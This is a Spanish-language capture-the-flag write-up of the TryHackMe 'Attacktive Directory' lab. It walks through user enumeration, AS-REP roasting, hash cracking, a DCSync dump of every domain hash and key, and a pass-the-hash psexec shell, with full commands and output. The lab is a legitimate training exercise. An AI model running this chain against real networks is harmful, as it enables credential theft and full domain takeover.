---
tags:
title: Attacktive Directory - Medium (THM)
permalink: /Attacktive Directory-THM-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
nmapf 10.65.141.52 -Pn
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-10 12:45 -0400
Initiating Parallel DNS resolution of 1 host. at 12:45
Completed Parallel DNS resolution of 1 host. at 12:45, 0.50s elapsed
Initiating SYN Stealth Scan at 12:45
Scanning 10.65.141.52 [65535 ports]
Discovered open port 139/tcp on 10.65.141.52
Discovered open port 3389/tcp on 10.65.141.52
Discovered open port 135/tcp on 10.65.141.52
Discovered open port 49671/tcp on 10.65.141.52
Discovered open port 636/tcp on 10.65.141.52
Discovered open port 389/tcp on 10.65.141.52
Discovered open port 49670/tcp on 10.65.141.52
Discovered open port 49664/tcp on 10.65.141.52
Completed SYN Stealth Scan at 12:46, 20.57s elapsed (65535 total ports)
Nmap scan report for 10.65.141.52
Host is up, received user-set (0.17s latency).
Scanned at 2026-03-10 12:45:52 EDT for 21s
Not shown: 34890 closed tcp ports (reset), 30637 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       REASON
135/tcp   open  msrpc         syn-ack ttl 126
139/tcp   open  netbios-ssn   syn-ack ttl 126
389/tcp   open  ldap          syn-ack ttl 126
636/tcp   open  ldapssl       syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126
49664/tcp open  unknown       syn-ack ttl 126
49670/tcp open  unknown       syn-ack ttl 126
49671/tcp open  unknown       syn-ack ttl 126

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.14 seconds
           Raw packets sent: 203803 (8.967MB) | Rcvd: 34929 (1.398MB)
-e [*] IP: 10.65.141.52
[*] Puertos abiertos: 135,139,389,636,3389,49664,49670,49671
/usr/bin/xclip
-e [*] Service scanning with nmap against 135,139,389,636,3389,49664,49670,49671 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-10 12:46 -0400
Nmap scan report for spookysec.local (10.65.141.52)
Host is up (0.17s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
636/tcp   open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2026-03-09T16:45:46
|_Not valid after:  2026-09-08T16:45:46
|_ssl-date: 2026-03-10T16:47:21+00:00; -6s from scanner time.
| rdp-ntlm-info:
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   DNS_Tree_Name: spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-03-10T16:47:07+00:00
49664/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
|_smb2-time: ERROR: Script execution failed (use -d to debug)
|_clock-skew: mean: -5s, deviation: 0s, median: -6s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.79 seconds
```
### Other nmap
Por alguna razón mi script no me devolvió la cantidad de puertos completa así que lo volví a correr nuevamente.

```BASH
 nmap -sS --open -p- -v -n --min-rate 5000 10.65.141.52 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-10 12:48 -0400
Initiating SYN Stealth Scan at 12:48
Scanning 10.65.141.52 [65535 ports]
Discovered open port 139/tcp on 10.65.141.52
Discovered open port 445/tcp on 10.65.141.52
Discovered open port 53/tcp on 10.65.141.52
Discovered open port 135/tcp on 10.65.141.52
Discovered open port 80/tcp on 10.65.141.52
Discovered open port 3389/tcp on 10.65.141.52
Discovered open port 49677/tcp on 10.65.141.52
Discovered open port 49677/tcp on 10.65.141.52
Discovered open port 88/tcp on 10.65.141.52
Discovered open port 49669/tcp on 10.65.141.52
Discovered open port 49670/tcp on 10.65.141.52
Discovered open port 49691/tcp on 10.65.141.52
Discovered open port 49667/tcp on 10.65.141.52
Discovered open port 49664/tcp on 10.65.141.52
Discovered open port 49695/tcp on 10.65.141.52
Discovered open port 49673/tcp on 10.65.141.52
Discovered open port 47001/tcp on 10.65.141.52
Discovered open port 5985/tcp on 10.65.141.52
Discovered open port 49671/tcp on 10.65.141.52
Discovered open port 3268/tcp on 10.65.141.52
Discovered open port 593/tcp on 10.65.141.52
Discovered open port 9389/tcp on 10.65.141.52
Discovered open port 3269/tcp on 10.65.141.52
Discovered open port 636/tcp on 10.65.141.52
Discovered open port 389/tcp on 10.65.141.52
Discovered open port 464/tcp on 10.65.141.52
Discovered open port 49665/tcp on 10.65.141.52
Completed SYN Stealth Scan at 12:48, 17.20s elapsed (65535 total ports)
Nmap scan report for 10.65.141.52
Host is up (0.17s latency).
Not shown: 65297 closed tcp ports (reset), 212 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49673/tcp open  unknown
49677/tcp open  unknown
49691/tcp open  unknown
49695/tcp open  unknown

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.30 seconds
           Raw packets sent: 84427 (3.715MB) | Rcvd: 68908 (2.766MB)
```
### Kerbrute userenum

Use `kerbrute` para enumerar usuarios del dominio.

```bash
zs1n@ptw ~> kerbrute userenum --dc 10.65.141.52 -d spookysec.local /usr/share/seclists/Usernames/userslist.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 03/10/26 - Ronnie Flathers @ropnop

2026/03/10 12:48:48 >  Using KDC(s):
2026/03/10 12:48:48 >  	10.65.141.52:88

2026/03/10 12:48:48 >  [+] VALID USERNAME:	 james@spookysec.local
2026/03/10 12:48:55 >  [+] VALID USERNAME:	 James@spookysec.local
2026/03/10 12:48:56 >  [+] VALID USERNAME:	 robin@spookysec.local
2026/03/10 12:49:11 >  [+] VALID USERNAME:	 darkstar@spookysec.local
2026/03/10 12:49:41 >  [+] VALID USERNAME:	 svc-admin@spookysec.local
2026/03/10 12:49:20 >  [+] VALID USERNAME:	 administrator@spookysec.local
2026/03/10 12:49:41 >  [+] VALID USERNAME:	 backup@spookysec.local
2026/03/10 12:49:49 >  [+] VALID USERNAME:	 paradox@spookysec.local
2026/03/10 12:50:45 >  [+] VALID USERNAME:	 JAMES@spookysec.local
2026/03/10 12:51:04 >  [+] VALID USERNAME:	 Robin@spookysec.local
2026/03/10 12:52:59 >  [+] VALID USERNAME:	 Administrator@spookysec.local
```
### AS - REP Roasting

Use al usuario `svc-admin` el cual era el único que me dejaba usar vía `null session` donde conseguí su hash.

```bash
zs1n@ptw ~> GetNPUsers.py spookysec.local/svc-admin -no-pass
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:c85178dc145ec66e7c1fbbcd97eb4916$358ae4d5e7dd8cbdae77bf0835397713ba72ac40d147991fb52fb009eb11555f7ca2389c1063d8be9017a81179309a4c51a89428fe31b0e317fa1c102b70bb645235685815a9595d59da77faf18369b521ceaa7c4cfb955e5a51e8dc0de45dfdbccb8d40c8b0590533f2085f471fecb2a651ac473451d11b5d98f6368dee19e38fd402c1b34be62b4067266963e5f1ab13d6de829eb314e150a0100a0b045f37b410d3d9dbfdc368abacc410e87745d9d757f2716eeeb8c53c8f46c0250704916e5cdd98f8ae4bd30ad1f583ee4241a67f93309335985f91416af0d0a353dddaabee99a1370e493fc312543464def6116842
```
### Crack password

Use `john` para romper el mismo, dándome así su password.

```bash
zs1n@ptw ~> j hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)
1g 0:00:00:03 DONE (2026-03-10 12:53) 0.2824g/s 1649Kp/s 1649Kc/s 1649KC/s manaia05..mamuchoteamo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
## Auth as backup

Usando las mismas credenciales me conecte al puerto `445` por smbclient, donde vi en el recurso `backup` un archivo.

```bash
zs1n@ptw ~> impacket-smbclient sppokysec.local/svc-admin:management2005@ATTACKTIVEDIREC.spookysec.local -dc-ip 10.65.141.52
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
ADMIN$
backup
C$
IPC$
NETLOGON
SYSVOL
# use backup
ls
# ls
drw-rw-rw-          0  Sat Apr  4 15:08:39 2020 .
drw-rw-rw-          0  Sat Apr  4 15:08:39 2020 ..
-rw-rw-rw-         48  Sat Apr  4 15:08:53 2020 backup_credentials.txt
# get backup_credentials.txt
```
### Credentials

Viendo el contenido del mismo, estaba en `base64` por lo que lo decodifique.

```bash
zs1n@ptw ~> cat backup_credentials.txt
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw                                                                                                                           
zs1n@ptw ~> echo YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw | base64 -d
backup@spookysec.local:backup2517860
```

Con las credenciales de este usuario recolecte los datos para `bloodhound`.

```bash
zs1n@ptw ~> rusthound-ce -d spookysec.local -f ATTACKTIVEDIREC.spookysec.local -i 10.65.141.52 -u backup -p 'backup2517860' -z -c All
---------------------------------------------------
Initializing RustHound-CE at 12:56:37 on 03/10/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-03-10T16:56:37Z INFO  rusthound_ce] Verbosity level: Info
[2026-03-10T16:56:37Z INFO  rusthound_ce] Collection method: All
[2026-03-10T16:56:37Z INFO  rusthound_ce::ldap] Connected to SPOOKYSEC.LOCAL Active Directory!
[2026-03-10T16:56:37Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-03-10T16:56:38Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-10T16:56:40Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=spookysec,DC=local
[2026-03-10T16:56:40Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-10T16:56:42Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=spookysec,DC=local
[2026-03-10T16:56:42Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-10T16:56:49Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=spookysec,DC=local
[2026-03-10T16:56:49Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-10T16:56:49Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=spookysec,DC=local
[2026-03-10T16:56:49Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-10T16:56:49Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=spookysec,DC=local
[2026-03-10T16:56:49Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-03-10T16:56:49Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
[2026-03-10T16:56:49Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-03-10T16:56:49Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-03-10T16:56:49Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-03-10T16:56:49Z INFO  rusthound_ce::json::maker::common] 18 users parsed!
[2026-03-10T16:56:49Z INFO  rusthound_ce::json::maker::common] 62 groups parsed!
[2026-03-10T16:56:49Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-03-10T16:56:49Z INFO  rusthound_ce::json::maker::common] 3 ous parsed!
[2026-03-10T16:56:49Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-03-10T16:56:49Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-03-10T16:56:49Z INFO  rusthound_ce::json::maker::common] 75 containers parsed!
[2026-03-10T16:56:49Z INFO  rusthound_ce::json::maker::common] .//20260310125649_spookysec-local_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 12:56:49 on 03/10/26! Happy Graphing!
```
### DCSync attack

Viendo que tenia `GenericAll` sobre muchos usuarios.

![image-center](/assets/images/Pasted image 20260310140917.png)

Por lo que use `secretsdump` para dumpear todos los hashes del dominio y así conseguir el hash del usuario `administrator`.

```bash
zs1n@ptw ~> impacket-secretsdump spookysec.local/backup:backup2517860@ATTACKTIVEDIREC.spookysec.local -dc-ip 10.65.141.52
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:fb45182c02a3e96142bab84ef3d90c1f:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:148c6d97c7779a9e4e68f6b03cac19087eef9ff09f5e1c2eba28270635f60cce
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:39e1c7ac18b83ed4a12af88f7cb72339
ATTACKTIVEDIREC$:des-cbc-md5:9426b6febf6dc2ab
[*] Cleaning up...
```
### psexec

Use `psexec` de impacket para conectarme a la maquina.

```powershell
impacket-psexec spookysec.local/administrator@ATTACKTIVEDIREC.spookysec.local -hashes :0e0363213e37b94221497260b0bcb4fc -dc-ip 10.65.141.52
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on ATTACKTIVEDIREC.spookysec.local.....
[*] Found writable share ADMIN$
[*] Uploading file qReeIqFq.exe
[*] Opening SVCManager on ATTACKTIVEDIREC.spookysec.local.....
[*] Creating service eCOl on ATTACKTIVEDIREC.spookysec.local.....
[*] Starting service eCOl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1490]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd C:\Users\Administrator\Desktop

 Directory of C:\Users\Administrator\Desktop

04/04/2020  11:39 AM    <DIR>          .
04/04/2020  11:39 AM    <DIR>          ..
04/04/2020  11:39 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  14,479,679,488 bytes free.

C:Users\Administrator\Desktop> type root.txt
TryHackMe{4ctiveD1rectoryM4st3r}
```

 PD: Con las credenciales del usuario `backup` se puede acceder por `RDP` a la maquina para visualizar la flag.
 
`~Happy Hacking`